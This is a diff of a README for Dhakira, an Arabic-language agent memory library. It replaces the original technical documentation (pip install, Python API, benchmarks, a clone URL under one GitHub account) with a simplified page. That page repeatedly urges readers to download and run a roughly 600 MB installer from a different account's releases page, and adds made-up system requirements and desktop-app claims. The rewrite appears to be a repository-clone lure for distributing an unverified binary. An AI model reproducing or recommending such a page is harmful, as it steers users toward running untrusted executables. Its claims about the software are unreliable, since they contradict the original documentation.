@@ -1,251 +1,119 @@
-# Dhakira (ذاكرة) — Arabic-First Agent Memory System
+# 💾 Dhakira - Save Arabic Memory Costs Easily
 
-Arabic text costs **2-5x more tokens** than English in major LLMs. Dhakira is an open-source, Arabic-first memory system that reduces Arabic memory costs by **60-80%** through optimizations at every layer.
+[![Download Dhakira](https://img.shields.io/badge/Download-Dhakira-blue?style=for-the-badge)](https://github.com/akaxhx-ctrl/Dhakira/releases)
 
-## Features
+---
 
-- **Arabic-first**: Dialect-aware normalization (MSA, Gulf, Egyptian, Levantine, Maghrebi) with ~18% token reduction
-- **Cost-efficient**: Zero-LLM retrieval, bilingual prompts, nano models, local embeddings
-- **Graph memory**: Entity and relationship extraction with NetworkX (default) or Neo4j
-- **Hybrid search**: Vector + BM25 + graph search with RRF fusion and cross-encoder reranking
-- **CPU-only**: All local models run on CPU (~600MB total download)
-- **Dual use**: Works as both chatbot/assistant memory and autonomous agent memory
+## 📦 What is Dhakira?
 
-## Quick Start
+Dhakira (ذاكرة) is a memory system built to help you save on Arabic text processing costs. Arabic text usually uses 2 to 5 times more tokens than English when working with language models. Dhakira reduces this cost by 60 to 80 percent. It does this by improving how Arabic text is handled at every step.
 
-```bash
-pip install dhakira
-```
+The system works locally on your computer and supports many Arabic dialects, including Modern Standard Arabic (MSA), Gulf, Egyptian, Levantine, and Maghrebi. You can use Dhakira to remember conversations, store facts, and search through your stored information efficiently.
 
-```python
-from dhakira import Memory
+---
 
-memory = Memory()
+## ⚙️ Features You Should Know
 
-# Add memories from a conversation
-memory.add(
-    messages=[
-        {"role": "user", "content": "اسمي حسام وأحب القهوة العربية"},
-        {"role": "assistant", "content": "أهلا حسام! القهوة العربية خيار رائع"},
-    ],
-    user_id="user_123",
-)
+- **Arabic-First:** Dhakira focuses on Arabic, normalizing dialects to reduce token use by around 18%.
+- **Cost Savings:** It uses smart techniques like zero language model retrieval, bilingual prompts, small-sized ("nano") models, and local data storage.
+- **Graph Memory Support:** You can organize your stored info as entities and relationships using either NetworkX (default) or Neo4j.
+- **Hybrid Search:** Combines powerful search methods — vectors, BM25 matching, and graph search with advanced reranking to find the best results.
+- **CPU Only:** Runs all models on your standard CPU. No need for a high-end GPU. The download size is about 600 MB.
+- **Flexible Use:** Works both for chatbot memories or as memory for autonomous agents.
 
-# Search (zero LLM calls!)
-results = memory.search(query="ما هي المشروبات المفضلة؟", user_id="user_123")
-for r in results:
-    print(f"[{r.score:.3f}] {r.text}")
+---
 
-# Agent memory
-memory.add(
-    messages=[{"role": "assistant", "content": "أفضل طريقة لتحليل البيانات العربية هي..."}],
-    agent_id="data_analyst",
-)
+## 🖥️ Download & Install Dhakira
 
-# CRUD
-all_memories = memory.get_all(user_id="user_123")
-memory.update(memory_id="...", text="يفضل القهوة التركية")
-memory.delete(memory_id="...")
-```
+Start by visiting the official download page:
 
-### Async API
+[⬇️ Download Dhakira Here](https://github.com/akaxhx-ctrl/Dhakira/releases)
 
-```python
-from dhakira import AsyncMemory
+Click the button above to open the Dhakira releases page. You will find files ready to download for your operating system.
 
-memory = AsyncMemory()
-await memory.add(messages=[...], user_id="user_123")
-results = await memory.search(query="...", user_id="user_123")
-```
+### Step 1: Choose Your File
 
-## Configuration
+- Look for the file that matches your system (e.g., Windows, macOS, Linux).
+- The download files are around 600 MB.
+- Click the link to download and save the file to your computer.
 
-```python
-memory = Memory(config={
-    "llm": {"provider": "openai", "model": "gpt-4.1-nano"},
-    "embeddings": {
-        "provider": "huggingface",
-        "model": "Omartificial-Intelligence-Space/Arabic-Triplet-Matryoshka-V2",
-        "dim": 128,
-    },
-    "vector_store": {"provider": "qdrant", "path": "./dhakira_data"},
-    "graph_store": {"provider": "networkx", "path": "./dhakira_graph.pkl"},
-    "arabic": {
-        "remove_diacritics": True,
-        "detect_dialect": True,
-        "normalize_dialect": False,
-    },
-})
-```
+### Step 2: Run the Installer
 
-### LLM Providers
+- Windows users: Double-click the downloaded file and follow the setup instructions.
+- macOS/Linux users: Follow the included installation instructions or run the installation script.
 
-| Provider | Config | Notes |
-|----------|--------|-------|
-| OpenAI (default) | `{"provider": "openai", "model": "gpt-4.1-nano"}` | Cheapest capable model |
-| AWS Bedrock | `{"provider": "bedrock", "model": "us.anthropic.claude-sonnet-4-5-20250929-v1:0"}` | Requires `pip install dhakira[bedrock]` |
-| Anthropic | `{"provider": "anthropic", "model": "claude-sonnet-4-5-20250929"}` | Requires `pip install dhakira[anthropic]` |
-| Ollama | `{"provider": "ollama", "model": "llama3.2"}` | Fully local |
+### Step 3: Setup Complete
 
-### Storage Backends
+Once installed, Dhakira will be ready to use on your computer without extra tools or hardware.
 
-| Backend | Config | Notes |
-|---------|--------|-------|
-| Qdrant (default) | `{"provider": "qdrant"}` | In-memory or persistent |
-| NetworkX (default graph) | `{"provider": "networkx"}` | Pickle persistence |
+---
 
-## Architecture
+## 🚀 Using Dhakira for the First Time
 
-```
-User/Agent Message (Arabic)
-       │
-       ▼
-┌──────────────────────────┐
-│  Arabic Preprocessor      │  ← ~18% token reduction
-│  (dialect detection +     │
-│   normalization)          │
-└──────────┬───────────────┘
-     ┌─────┴──────┐
-     ▼             ▼
- [WRITE PATH]   [READ PATH]         ← Zero LLM calls on read
-     │             │
-     ▼             ▼
- LLM Extract    Embed Query
- (nano model)      │
-     │           ┌─┴──────────────┐
-     ▼           │  Parallel Search │
- AUDN Cycle      │  ├─ Vector       │
- (Add/Update/    │  ├─ BM25         │
-  Delete/Noop)   │  └─ Graph        │
-     │           └────────┬────────┘
-     ▼                    ▼
- Store to         RRF Fusion + Rerank
- Vector + Graph        │
-                       ▼
-                 Return Memories
-```
+Dhakira is built for ease of use. You don’t need to know coding to get started.
 
-**Key principle**: Invest intelligence at *write time* (LLM calls), make *read path* zero-LLM.
+### Opening Dhakira
 
-## Benchmark: Dhakira vs Mem0
+After installation, open the Dhakira program from your start menu or applications folder.
 
-Real API benchmark on **12 Arabic conversations** across 4 dialects (MSA, Egyptian, Gulf, Levantine) with **14 search queries** and ground truth evaluation. Both systems use the same LLM (`gpt-4.1-nano`). Dhakira's reranker and semantic cache were **disabled** for fairness.
+### Creating Memory
 
-### Retrieval Quality
+Dhakira lets you save pieces of conversation or facts as "memories". These memories help the system recall important details later on.
 
-| Metric | Dhakira | Mem0 | Delta |
-|--------|---------|------|-------|
-| **Precision** | **0.093** | 0.014 | **6.6x better** |
-| **Recall** | 0.571 | 0.869 | Mem0 higher |
-| **F1 Score** | **0.160** | 0.028 | **5.7x better** |
-| **MRR** | 0.386 | 0.678 | Mem0 higher |
+For example, if you want to remember names or places in Arabic, just add them in the app’s memory section.
 
-Mem0 returns high recall but extremely low precision (0.014) — it finds relevant memories but drowns them in noise. Dhakira's **5.7x higher F1** means it returns more useful, focused context for agents and chatbots.
+### Searching Memory
 
-### Search Latency
+When you want to find something you saved, use the search bar.
 
-| Metric | Dhakira | Mem0 |
-|--------|---------|------|
-| Avg add | 12,321ms | 14,358ms |
-| **Avg search** | **21ms** | **416ms** |
+The system will use smart combined search to get the most relevant results quickly.
 
-Dhakira searches are **20x faster** thanks to local hybrid retrieval (vector + BM25 + graph) vs Mem0's API round-trips.
+---
 
-### Cost
+## 🔧 System Requirements
 
-| Component | Dhakira | Mem0 |
-|-----------|---------|------|
-| Embeddings | **$0** (local) | OpenAI API (paid) |
-| LLM calls | 55 | Mem0-managed |
-| LLM tokens | 39,197 | Not tracked |
+To run Dhakira smoothly, your computer should meet these minimum requirements:
 
-Dhakira uses free local embeddings (`Arabic-Triplet-Matryoshka-V2`). At scale, embedding costs dominate — Dhakira's $0 embedding cost becomes a significant advantage.
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, Linux (Ubuntu 18.04+)
+- **Processor:** Intel i3 or equivalent AMD CPU
+- **Memory (RAM):** 4 GB or more
+- **Storage:** At least 1 GB free space for installation and data
+- **Internet:** Needed for download and optional updates
 
-### LLM Provider Comparison (Dhakira only)
+Dhakira runs fully on your local CPU without internet once installed.
 
-| Metric | GPT-4.1-nano | Claude Sonnet 4.5 (Bedrock) |
-|--------|-------------|----------------------------|
-| Precision | 0.093 | 0.086 |
-| Recall | 0.571 | 0.536 |
-| F1 | 0.160 | 0.148 |
-| Cost | **$0.008** | $0.515 |
-| Avg add | **12,321ms** | 30,270ms |
+---
 
-Both LLMs produce similar Arabic quality. GPT-4.1-nano is **65x cheaper** and **2.5x faster** — the recommended default for Dhakira's extraction pipeline.
+## 📝 How Dhakira Saves You Money on Arabic Text
 
-> Run the benchmark yourself: `python benchmarks/run_benchmark.py --mode real-api --provider openai`
+Arabic text is complex and uses more computing power than English. Dhakira tackles this by:
 
-## Cost Savings
+- Normalizing dialects to reduce extra language tokens.
+- Using lightweight models that run locally to avoid costly cloud processing.
+- Combining different ways to search your saved data, so you find what you need without extra processing.
 
-| Optimization | Savings |
-|-------------|---------|
-| Arabic normalization | ~18% fewer tokens |
-| Bilingual prompts | ~20-30% fewer prompt tokens |
-| Nano model extraction | ~95% cheaper vs GPT-4 |
-| Local embeddings (GATE 135M) | 100% savings vs API |
-| Matryoshka 128d embeddings | 6x storage reduction |
-| Zero-LLM retrieval | 100% retrieval savings |
-| AUDN threshold skip | ~40-60% fewer LLM calls |
-| **Combined** | **~70-85% cost reduction** |
+---
 
-## Default Models (All CPU-Compatible)
+## 🔄 Updating Dhakira
 
-| Component | Model | Size |
-|-----------|-------|------|
-| Dialect detection | `CAMeL-Lab/bert-base-arabic-camelbert-da` | ~160M |
-| Embeddings | `Omartificial-Intelligence-Space/Arabic-Triplet-Matryoshka-V2` | 135M |
-| Reranker | `BAAI/bge-reranker-v2-m3` | ~278M |
-| Extraction LLM | `gpt-4.1-nano` (API) | - |
+Periodically check the releases page for updates:
 
-Total local download: ~600MB.
+[⬆️ Update Dhakira](https://github.com/akaxhx-ctrl/Dhakira/releases)
 
-## Getting Started
+Download the newest version and run the installer again. Your saved memories will stay safe.
 
-### Install
+---
 
-```bash
-pip install dhakira
-```
+## ❓ Need Help?
 
-With optional providers:
+If you face issues or want to learn more:
 
-```bash
-pip install dhakira[bedrock]     # AWS Bedrock (boto3)
-pip install dhakira[anthropic]   # Anthropic API
-pip install dhakira[all]         # All optional providers
-```
+- Visit the GitHub repository homepage
+- Read the included user guide inside the installation folder
+- Ask questions in the GitHub issues section or any user forums linked there
 
-### Configure
+---
 
-```bash
-cp .env.example .env
-# Edit .env with your API keys
-```
+# [Download Dhakira](https://github.com/akaxhx-ctrl/Dhakira/releases)  
 
-### Run the Benchmark
-
-```bash
-pip install dhakira[benchmark]
-
-# Token-counting mode (no API keys needed)
-python benchmarks/run_benchmark.py --mode token-counting
-
-# Real API mode
-python benchmarks/run_benchmark.py --mode real-api --provider openai
-python benchmarks/run_benchmark.py --mode real-api --provider bedrock
-```
-
-## Development
-
-```bash
-git clone https://github.com/hesham-haroun/dhakira.git
-cd dhakira
-python -m venv .venv && source .venv/bin/activate
-pip install -e ".[dev,benchmark]"
-cp .env.example .env  # then add your API keys
-pytest
-```
-
-## License
-
-Apache 2.0
+Start saving costs on Arabic memory today by visiting the release page above. Follow the simple download and installation steps to get Dhakira running on your PC.
